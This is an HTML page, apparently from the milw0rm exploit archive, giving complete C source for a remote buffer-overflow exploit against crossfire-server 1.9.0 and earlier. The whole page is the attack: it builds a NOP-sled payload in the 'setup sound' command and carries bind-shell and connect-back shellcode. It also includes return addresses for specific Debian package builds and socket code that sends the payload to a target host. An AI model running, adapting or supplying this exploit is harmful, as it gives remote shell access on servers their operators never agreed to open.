<html><head><title>crossfire-server <= 1.9.0 SetUp() Remote Buffer Overflow Exploit</title></head><pre>// crossfire-server &lt;= 1.9.0 &quot;SetUp()&quot; remote buffer overflow
//
// exploit by landser - ihsahn at gmail com
// vote http://shinui.org.il
//

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;getopt.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netdb.h&gt;

#define PORT 13327 // default port
#define SC_PORT 33333 // default shellcode port
#define SC_HOST &quot;127.0.0.1&quot; // default shellcode host

unsigned char sc_cb[] = // izik's
	&quot;\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd&quot;
	&quot;\x80\x5b\x5d\xbeHOST\xf7\xd6\x56\x66\xbdPR\x0f\xcd\x09\xdd&quot;
	&quot;\x55\x43\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80\x87\xd9&quot;
	&quot;\x5b\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f&quot;
	&quot;\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xdf&quot;;

unsigned char sc_bind[] = // izik's
	&quot;\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd&quot;
	&quot;\x80\x5b\x5d\x52\x66\xbdPR\x0f\xcd\x09\xdd\x55\x6a\x10\x51&quot;
	&quot;\x50\x89\xe1\xb0\x66\xcd\x80\xb3\x04\xb0\x66\xcd\x80\x5f&quot;
	&quot;\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80\x93\xb0\x02\xcd&quot;
	&quot;\x80\x85\xc0\x75\x1a\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0&quot;
	&quot;\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52&quot;
	&quot;\x53\xeb\xb2\x6a\x06\x58\xcd\x80\xb3\x04\xeb\xc9&quot;;

struct {
	const char *type;
	unsigned char *code;
} shellcodes[] = {
	{&quot;bind&quot;,		sc_bind},
	{&quot;connectback&quot;,		sc_cb},
};

struct {
	const char *ver;
	unsigned long ret; // a &quot;jmp *%eax&quot; instruction
	unsigned short int len;
} targets[] = {
	{&quot;crossfire-server_1.6.0.dfsg.1-4_i386.deb&quot;,	0x080d6f48, 0x1028},
	{&quot;crossfire-server_1.8.0-2_i386.deb&quot;,		0x080506d7, 0x1130},
	{&quot;crossfire-server_1.9.0-1_i386.deb&quot;,		0x0807aefa, 0x1130},
	{&quot;crash&quot;,					0xcccccccc, 0x1300},
};

#define structsize(x) (sizeof x / sizeof x[0])

int s;
int n = -1;
unsigned char *sc = sc_bind; // default shellcode
unsigned char buf[0x2000];

void establish (char *, int);
void usage (char *);
void update (unsigned char *, int, char *);
void writebuf (void);

int main (int argc, char **argv) {
	int port = 0; // default value
	unsigned short int sc_port = 0;
	char *sc_host = NULL;

	printf(&quot;cf190.c by landser - ihsahn at gmail com\n\n&quot;);

	char c;
	while ((c = getopt(argc, argv, &quot;t:p:h:d:s:&quot;)) != -1) {
		switch (c) {
			case 's': sc = shellcodes[atoi(optarg)].code; break;
			case 'h': sc_host = strdup(optarg); break;
			case 'd': sc_port = atoi(optarg); break;
			case 't': n = atoi(optarg); break;
			case 'p': port = atoi(optarg); break;
			case '?': usage(argv[0]); return EXIT_FAILURE;
		}
	}

	if ((n &lt; 0) || (n &gt;= structsize(targets))) {
		printf(&quot;invalid target\n&quot;);
		usage(argv[0]);
		return EXIT_FAILURE;
	}
	
	if ((optind + 1) != argc) {
		printf(&quot;no hostname\n&quot;);
		usage(argv[0]);
		return EXIT_FAILURE;
	}

	establish(argv[optind], port ? port : PORT);
	
	update(sc, sc_port, sc_host);
       
	writebuf();

	printf(&quot;&gt; sending\n&quot;);

	if (send(s, buf, targets[n].len + 2, 0) &lt; 0) {
		perror(&quot;send()&quot;);
		return EXIT_FAILURE;
	}
	usleep(100000);

	printf(&quot;&gt; done\n&quot;);
	
	close(s);

	return EXIT_SUCCESS;
}

void establish (char *ip, int port) {
	struct sockaddr_in sa;
	struct hostent *h;

	if (!(h = gethostbyname(ip))) {
		herror(&quot;gethostbyname()&quot;);
		exit(EXIT_FAILURE);
	}
	printf(&quot;&gt; resolved %s to %s\n&quot;, ip,
			inet_ntoa(**((struct in_addr **)h-&gt;h_addr_list)));
	
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr = **((struct in_addr **)h-&gt;h_addr_list);
	
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0) {
		perror(&quot;socket()&quot;);
		exit(EXIT_FAILURE);
	}

	if (connect(s, (struct sockaddr *)&amp;sa, sizeof(struct sockaddr)) &lt; 0) {
		perror(&quot;connect()&quot;);
		exit(EXIT_FAILURE);
	}

	printf (&quot;&gt; connected to %s:%d.\n&quot;, inet_ntoa(**((struct in_addr **)h-&gt;h_addr_list)), port);
}

void usage (char *argv0) {
	int i;
	
	printf(&quot;usage: %s -t &lt;target&gt; [-s &lt;shellcode&gt;] &quot;
			&quot;[-d &lt;connectback/bind port] [-h &lt;connectback ip&gt;] &quot;
			&quot;host [-p &lt;port&gt;]\n&quot;, argv0);

	printf(&quot;- targets:\n&quot;);
	for (i=0;i&lt;structsize(targets);i++)
		printf(&quot;%d. %s\n&quot;, i, targets[i].ver);

	printf(&quot;- shellcodes: (default 0)\n&quot;);
	for (i=0;i&lt;structsize(shellcodes);i++)
		printf(&quot;%d. %s\n&quot;, i, shellcodes[i].type);
}

void update (unsigned char *code, int port, char *host) {
	if (!port) port = SC_PORT;
	
	if (!(port &amp; 0xff) || !((port &gt;&gt; 8) &amp; 0xff)) {
		printf(&quot;bad cb port\n&quot;);
		exit(EXIT_FAILURE);
	}
	*(unsigned short int *)(strstr(code, &quot;PR&quot;)) = port;

	if (strstr(code, &quot;HOST&quot;)) {
		in_addr_t inaddr;

		if (!host) host = SC_HOST;
		inaddr = inet_addr(host);
		
		if (inaddr == INADDR_NONE || strstr(host, &quot;255&quot;)) {
			// ~(255) is 0
			printf(&quot;invalid cb hostname\n&quot;);
			exit(EXIT_FAILURE);
		}
		*(in_addr_t *)(strstr(code, &quot;HOST&quot;)) = ~inaddr;
	}
	
	if (host) free(host);
}
	
void writebuf (void) {
	unsigned char *ptr = buf;
	
	memset(buf, 0x90, sizeof buf);

	*ptr++ = (targets[n].len&gt;&gt; 8) &amp; 0xff;
	*ptr++ = targets[n].len &amp; 0xff;
	
	memcpy(ptr, &quot;setup sound &quot;, strlen(&quot;setup sound &quot;));
	ptr += strlen(&quot;setup sound &quot;);
	
	ptr += 120; // leave 120 nops before the shellcode
	memcpy(ptr, sc, strlen(sc));
	
	ptr = &amp;buf[targets[n].len - 10];
	*(unsigned long *)ptr = targets[n].ret;
}

// milw0rm.com [2006-03-13]</pre></html>